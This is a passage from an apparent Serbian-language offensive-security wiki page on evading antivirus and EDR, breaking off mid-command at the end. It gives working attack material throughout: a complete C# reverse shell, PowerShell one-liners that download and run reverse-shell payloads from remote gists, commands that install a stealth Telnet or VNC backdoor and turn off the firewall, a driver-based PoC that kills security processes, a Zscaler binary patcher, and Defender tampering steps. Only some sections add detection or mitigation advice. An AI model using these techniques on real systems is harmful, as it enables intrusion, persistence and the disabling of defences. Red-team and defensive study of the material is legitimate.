- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operacija generisanih pomoću C++ template metaprogramming framework-a, što će osobi koja želi da crack-uje aplikaciju učiniti život malo težim.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscate različite PE fajlove, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executable fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za LLVM-supported jezike koji koristi ROP (return-oriented programming). ROPfuscator obfuscate program na assembly code nivou tako što regularne instructions transformiše u ROP chains, čime onemogućava naše prirodno shvatanje normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim da ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih executable fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je security mehanizam čija je namena da zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom funkcioniše na osnovu reputation-based pristupa, što znači da će aplikacije koje se retko preuzimaju aktivirati SmartScreen, čime će krajnji korisnik biti upozoren i sprečen da pokrene fajl (iako se fajl i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier, koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kog je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</figcaption></figure>

> [!TIP]
> Važno je napomenuti da executable fajlovi potpisani **trusted** signing certificate-om **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web jeste da ih upakujete unutar neke vrste container-a, kao što je ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u output containers kako bi zaobišao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a unutar ISO datoteka pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **loguju događaje**. Međutim, security products ga takođe mogu koristiti za nadgledanje i detekciju malicioznih aktivnosti.

Slično načinu na koji se AMSI onemogućava (bypass-uje), moguće je učiniti da funkcija **`EtwEventWrite`** user space procesa odmah vrati rezultat bez logovanja događaja. To se postiže patch-ovanjem funkcije u memoriji tako da odmah vrati rezultat, čime se efektivno onemogućava ETW logovanje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i i dalje predstavlja veoma dobar način za pokretanje post-exploitation alata bez detekcije od strane AV-a.

Pošto će se payload učitati direktno u memoriju bez dodirivanja diska, moraćemo da brinemo samo o patch-ovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava direktno učitavanje C# assemblies u memoriju, ali postoje različiti načini za to:

- **Fork\&Run**

Ovaj pristup podrazumeva **pokretanje novog sacrificial procesa**, inject-ovanje vašeg malicioznog post-exploitation koda u taj novi proces, izvršavanje malicioznog koda i, po završetku, gašenje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost fork and run metode je u tome što se izvršavanje odvija **izvan** našeg Beacon implant procesa. To znači da, ako nešto pođe po zlu ili bude detektovano tokom naše post-exploitation aktivnosti, postoji **mnogo veća verovatnoća** da će naš **implant preživeti.** Nedostatak je u tome što postoji **veća verovatnoća** da ćete biti uhvaćeni pomoću **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o inject-ovanju malicioznog post-exploitation koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali nedostatak je to što, ako nešto pođe po zlu tokom izvršavanja payload-a, postoji **mnogo veća verovatnoća** da ćete **izgubiti beacon**, jer može doći do crash-a.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies možete učitavati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video autora S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **interpreter environment-u instaliranom na Attacker Controlled SMB share-u**.

Omogućavanjem pristupa Interpreter Binaries i environment-u na SMB share-u možete **izvršavati proizvoljan kod u tim jezicima unutar memorije** kompromitovane mašine.

Repozitorijum navodi: Defender i dalje skenira skripte, ali korišćenjem Go-a, Java-e, PHP-a itd. dobijamo **veću fleksibilnost za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, ne-obfuskovanih reverse shell skripti u ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping je tehnika koja napadaču omogućava da **manipuliše access token-om ili security product-om kao što su EDR ili AV**, čime im omogućava da smanje njegove privilegije tako da proces neće biti ugašen, ali neće imati dozvole za proveru malicioznih aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **da zabrani eksternim procesima** dobijanje handle-ova nad tokenima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je samo deploy-ovati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje persistence-a:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Tiho pokrenite installer na računaru žrtve (potreban je admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop-a i kliknite na Next. Wizard će zatim tražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite dati parameter uz određene izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na pin parametar, koji omogućava postavljanje PIN-a bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma složena tema; ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, pa je praktično nemoguće ostati potpuno nedetektovan u zrelim okruženjima.

Svako okruženje protiv kog radite imaće sopstvene prednosti i slabosti.

Toplo vam preporučujem da pogledate ovo predavanje autora [@ATTL4S](https://twitter.com/DaniLJ94) kako biste dobili uvod u naprednije Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odlično predavanje autora [@mariuszbit](https://twitter.com/mariuszbit) o temi Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** sve dok **ne utvrdi koji deo Defender** detektuje kao maliciozan, a zatim ga izdvojiti za vas.\
Drugi alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), uz otvorenu web uslugu dostupnu na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi su dolazili sa **Telnet server-om** koji ste mogli da instalirate (kao administrator) pomoću:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i pokrenite ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promenite telnet port** (stealth) i onemogućite firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, a ne setup)

**NA HOSTU**: Izvršite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta veza**

**Napadač** treba da **izvrši na svom hostu** binarni fajl `vncviewer.exe -listen 5900`, kako bi bio **spreman** da prihvati obrnutu **VNC vezu**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run`, a zatim izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste održali stealth, ne smete raditi nekoliko stvari

- Nemojte pokretati `winvnc` ako je već pokrenut, jer ćete izazvati [popup](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez fajla `UltraVNC.ini` u istom direktorijumu, jer će se otvoriti [the config window](https://i.imgur.com/rfMQWcf.png)
- Nemojte izvršavati `winvnc -h` za pomoć, jer ćete izazvati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenjem kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje pythona za primer izrade injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Drugi alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Ubijanje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** za onemogućavanje endpoint zaštite pre pokretanja ransomware-a. Alat donosi svoj **vulnerable, ali *signed* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni AV servisi sa zaštitom Protected-Process-Light (PPL) ne mogu da blokiraju.<sup>[[12]](#references)</sup>

Ključne napomene
1. **Signed driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali je binarni fajl zapravo legitimno potpisani driver `AToolsKrnl64.sys` kompanije Antiy Labs, iz njihovog alata „System In-Depth Analysis Toolkit“. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postaje dostupan iz user land-a.
3. **IOCTL-ovi koje driver izlaže**
| IOCTL kod | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekid proizvoljnog procesa prema PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Brisanje proizvoljnog fajla sa diska |
| `0x990001D0` | Unload driver-a i uklanjanje servisa |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi user-mode zaštite; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili menja kernel objekte bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detekcija / Mitigacija
•  Omogućite Microsoft-ovu listu blokiranih vulnerable driver-a (`HVCI`, `Smart App Control`) kako bi Windows odbio učitavanje `AToolsKrnl64.sys`.
•  Nadgledajte kreiranje novih *kernel* servisa i generišite upozorenje kada se driver učita iz direktorijuma u koji svi mogu da upisuju ili kada nije prisutan na allow-listi.
•  Pratite user-mode handle-ove ka prilagođenim device objektima, nakon čega slede sumnjivi `DeviceIoControl` pozivi.

### Zaobilaženje Zscaler Client Connector Posture provera patchovanjem binarnih fajlova na disku

Zscaler-ov **Client Connector** lokalno primenjuje pravila device posture-a i oslanja se na Windows RPC za komunikaciju rezultata sa drugim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuno zaobilaženje:

1. Procena posture-a se odvija **u potpunosti na strani klijenta** (serveru se šalje boolean vrednost).
2. Interni RPC endpoint-i proveravaju samo da li je izvršni fajl koji se povezuje **potpisao Zscaler** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Patchovanjem četiri signed binarna fajla na disku** oba mehanizma mogu da se neutrališu:

| Binarni fajl | Originalna logika koja je patchovana | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera compliant |
| `ZSAService.exe` | Indirektni poziv ka `WinVerifyTrust` | NOP-ovan ⇒ svaki, čak i unsigned, proces može da se poveže na RPC cevi |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity provere tunnel-a | Preskočene |

Minimalni isečak patcher-a:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere stanja prikazuju **green/compliant**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore named-pipe RPC endpoint-e (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na strani klijenta i jednostavne provere potpisa mogu zaobići sa nekoliko izmena bajtova.

## Zloupotreba Protected Process Light (PPL) za menjanje AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) primenjuje hijerarhiju potpisnika/nivoa tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. Iz ofanzivne perspektive, ako možete legitimno da pokrenete binarni fajl sa omogućenim PPL-om i kontrolišete njegove argumente, benignu funkcionalnost (npr. logging) možete pretvoriti u ograničenu, PPL-om podržanu primitivu za upisivanje u zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta omogućava procesu da radi kao PPL
- Ciljni EXE (i sve učitane DLL datoteke) moraju biti potpisani EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess sa zastavicama: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarnog fajla (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware potpisnike, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešni nivoi će dovesti do neuspešnog kreiranja procesa.

Pogledajte i širi uvod u PP/PPL i LSASS zaštitu ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Helper otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnom EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac korišćenja:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binary `C:\Windows\System32\ClipUp.exe` sam se pokreće i prihvata parametar za upis log fajla na putanju koju zadaje pozivalac.
- Kada se pokrene kao PPL proces, upis fajla se izvršava uz PPL zaštitu.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 short paths za navođenje lokacija koje su obično zaštićene.

8.3 short path helpers
- Izlistajte short names: `dir /x` u svakom nadređenom direktorijumu.
- Izvedite short path u cmd-u: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (apstraktno)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla da biste prinudili kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Ako je potrebno, koristite 8.3 short names.
3) Ako je ciljni binary obično otvoren/zaključan od strane AV-a tokom rada (npr. MsMpEng.exe), zakažite upis pri boot-u, pre nego što se AV pokrene, instaliranjem auto-start servisa koji se pouzdano izvršava ranije. Validirajte redosled pokretanja pomoću Process Monitor-a (boot logging).
4) Nakon reboot-a, PPL-backed upis se izvršava pre nego što AV zaključa svoje binarije, čime se ciljni fajl oštećuje i sprečava pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje, već samo njegovo mesto; primitive je pogodan za korupciju, a ne za precizno ubacivanje sadržaja.
- Zahteva lokalne administratorske/SYSTEM privilegije za instaliranje/pokretanje service-a i period predviđen za reboot.
- Tajming je kritičan: ciljna datoteka ne sme biti otvorena; izvršavanje tokom boot-a izbegava file lock-ove.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada ga pokreću nestandardni launcher-i, u periodu oko boot-a.
- Novi service-i konfigurisani za auto-start sumnjivih binary-ja i njihovo dosledno pokretanje pre Defender/AV-a. Istražite kreiranje/izmenu service-a pre neuspeha pokretanja Defender-a.
- File integrity monitoring Defender binary-ja/Platform direktorijuma; neočekivano kreiranje/izmena datoteka od strane procesa sa protected-process flag-ovima.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binary-ja koji nisu AV.

Ublažavanje
- WDAC/Code Integrity: ograničite koji potpisani binary-ji mogu da se pokreću kao PPL i pod kojim parent procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Service hygiene: ograničite kreiranje/izmenu auto-start service-a i nadzirite manipulisanje redosledom pokretanja.
- Obezbedite da su Defender tamper protection i early-launch zaštite omogućene; istražite startup greške koje ukazuju na korupciju binary-ja.
- Razmotrite onemogućavanje generisanja 8.3 short-name-ova na volume-ima koji hostuju security tooling, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Tampering Microsoft Defender-a putem Symlink Hijack-a foldera verzije Platform-a

Windows Defender bira platformu iz koje se pokreće enumerisanjem podfoldera unutar:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfolder sa najvišim leksikografskim stringom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće Defender service procese (uz ažuriranje putanja service-a/registry-ja). Ovaj izbor veruje directory entry-jima, uključujući directory reparse point-e (symlink-ove). Administrator to može iskoristiti da preusmeri Defender na path u koji attacker može da upisuje i postigne DLL sideloading ili prekid rada service-a.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalna Administrator privilegija (potrebna za kreiranje direktorijuma/symlink-ova unutar Platform foldera)
- Mogućnost reboot-a ili pokretanja ponovnog izbora Defender platforme (restart service-a pri boot-u)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u svoje foldere, ali njegov izbor platforme veruje directory entry-jima i bira leksikografski najvišu verziju bez provere da li se target razrešava u zaštićen/trusted path.

Korak po korak (primer)
1) Pripremite writable clone trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
